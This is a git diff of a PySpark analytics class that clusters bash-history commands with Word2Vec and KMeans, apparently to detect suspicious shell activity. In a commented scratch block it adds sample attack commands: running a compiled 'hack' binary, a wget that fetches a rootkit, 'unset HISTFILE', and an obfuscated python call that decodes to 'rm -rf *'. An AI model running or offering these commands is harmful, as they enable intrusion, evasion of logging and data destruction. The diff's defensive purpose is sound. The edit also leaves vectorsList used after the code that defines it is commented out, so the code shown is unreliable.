@@ -981,31 +981,45 @@ class AnalyticsEngine(object):
             self.bashDF.persist(StorageLevel.MEMORY_ONLY_SER)
 
         commandsDF = self.bashDF.select(self.bashDF.command)
+
         '''
         from pyspark.ml.feature import Word2Vec
         from pyspark.ml.clustering import KMeans, KMeansModel
         from pyspark.sql import SQLContext, Row
 
         sqlctx = SQLContext(sc)
-        df = sqlctx.read.load("/user/cloudera/bashlog/year=2015/month=07")
+        df = sqlctx.read.load("/user/cloudera/bashlog/year=2015/month=07").cache()
         cmdsDF = df.select(df.command).map(lambda row: Row(command=row.command.split(" "))).toDF()
-        try without the split
         cmdsDF.cache()
-        word2Vec = Word2Vec(vectorSize=10, minCount=0, inputCol="command", outputCol="features")
+
+        word2Vec = Word2Vec(vectorSize=100, minCount=1, inputCol="command", outputCol="features")
         w2model = word2Vec.fit(cmdsDF)
-        w2model.save("/user/cloudera/models/w2v_bash")
+
         resultDF = w2model.transform(cmdsDF)
         resultDF.cache()
-        kmeans = KMeans(k=20, seed=42)
-        vectors = resultDF.select(resultDF.features)
-        vectors.cache()
-        kmodel = kmeans.fit(vectors)
+
+        kmeans = KMeans(k=650, seed=42, featuresCol="features", predictionCol="prediction", maxIter=10, initSteps=3)
+        kmodel = kmeans.fit(resultDF)
+
         centers = kmodel.clusterCenters()
-        transformed = kmodel.transform(vectors).select("features", "prediction")
+        transformed = kmodel.transform(resultDF)
+
         rows = transformed.collect()
         >>> transformed.where(transformed.prediction == 2).select(transformed.command).take(50)
 
+        documentDF = sqlctx.createDataFrame([
+          ("gcc hack.c -o hack;./hack".split(" "), ),
+          ("wget http://wwww.my.com/rootkit.gz".split(" "), ),
+          ("modprobe m.o".split(" "), ),
+          ("unset HISTFILE".split(" "), ),
+          ("python -c 'import os; os.system(''.join([chr(ord(i)-1) for i in 'sn!.sg!+']))'".split(" "), )
+        ], ["command"])
+
+       save transformed DF into parquet, then load it, re-fit models using it. Much faster this way
+       since we dont have a save/.load function
+
         '''
+
         commandsDF.cache()
 
         # RDD of list of words in each command
@@ -1017,6 +1031,10 @@ class AnalyticsEngine(object):
         self.w2vmodel = self.w2v.fit(commandsRDD)
 
         commandsListRDD = commandsDF.rdd.flatMap(lambda row: row.command.split("\n"))
+
+
+
+        '''
         commandsList = self.sc.parallelize(commandsListRDD.take(1000)).collect()
         vectorsList = []
 
@@ -1028,7 +1046,7 @@ class AnalyticsEngine(object):
 
         kmdata = self.sc.parallelize(vectorsList, 1024)
         kmdata.cache()
-
+        '''
         k = int(sqrt(len(vectorsList) / 2))
 
         # Build the model (cluster the data using KMeans)
